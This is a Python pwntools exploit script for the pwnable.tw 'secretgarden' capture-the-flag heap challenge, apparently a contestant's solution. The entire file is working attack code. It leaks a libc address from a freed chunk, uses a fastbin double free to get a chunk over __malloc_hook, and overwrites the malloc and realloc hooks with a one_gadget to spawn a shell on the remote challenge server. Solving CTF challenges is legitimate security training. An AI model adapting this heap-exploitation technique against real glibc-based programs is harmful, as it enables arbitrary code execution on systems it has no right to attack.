#!/usr/bin/env python3

from pwn import *

exe = ELF("./secretgarden_patched", checksec=False)
libc = ELF("./libc_64.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)
libc.sym['one_gadget'] = 0xef6c4

context.binary = exe
context.log_level = 'debug'

def raise_flower(length, name, color):
    p.sendlineafter(b' : ', b'1')
    p.sendlineafter(b' :', str(length).encode())
    p.sendafter(b' :', name)         # name use read()
    p.sendlineafter(b' :', color)    # color use scanf()

def visit_garden():
    p.sendlineafter(b' : ', b'2')

def remove_flower(idx):
    p.sendlineafter(b' : ', b'3')
    p.sendlineafter(b':', str(idx).encode())

def clean_garden():
    p.sendlineafter(b' : ', b'4')

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10203)
    return r

p = conn()

##################################
### Stage 1: Leak libc address ###
##################################
raise_flower(0x420, b'0'*8, b'0'*8)
raise_flower(0x420, b'1'*8, b'1'*8)
remove_flower(0)

raise_flower(0x400 - 0x10, b'2'*8, b'2'*8)

visit_garden()
p.recvuntil(b'2'*8)
libc_leak = u64(p.recv(6) + b'\x00\x00')
log.info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x3c3b78
log.info("Libc base: " + hex(libc.address))

#######################################
### Stage 2: Attach `__malloc_hook` ###
#######################################
raise_flower(0x68, b'3'*8, b'3'*8)
raise_flower(0x68, b'4'*8, b'4'*8)
remove_flower(3)
remove_flower(4)
remove_flower(3)

raise_flower(0x68, p64(libc.sym["__malloc_hook"] - 0x23), b'6'*8)
raise_flower(0x68, b'7', b'7'*8)
raise_flower(0x68, b'8', b'8'*8)

 #   0x155554fe8b10 <realloc+0>      push   r15
 #   0x155554fe8b12 <realloc+2>      push   r14
 #   0x155554fe8b14 <realloc+4>      push   r13
 #   0x155554fe8b16 <realloc+6>      push   r12
 #   0x155554fe8b18 <realloc+8>      mov    r13, rsi
 #   0x155554fe8b1b <realloc+11>     push   rbp
 #   0x155554fe8b1c <realloc+12>     push   rbx
 #   0x155554fe8b1d <realloc+13>     mov    rbx, rdi
 #   0x155554fe8b20 <realloc+16>     sub    rsp, 0x38
 #   0x155554fe8b24 <realloc+20>     mov    rax, QWORD PTR [rip+0x33f4a5]        # 0x155555327fd0

payload = flat(
    b'A'*11, 
    libc.sym['one_gadget'],           # Overwrite __realloc_hook
    libc.sym['__libc_realloc']+20,    # Overwrite __malloc_hook
    )
raise_flower(0x68, payload, b'9'*8)

p.sendlineafter(b' : ', b'1')
p.interactive()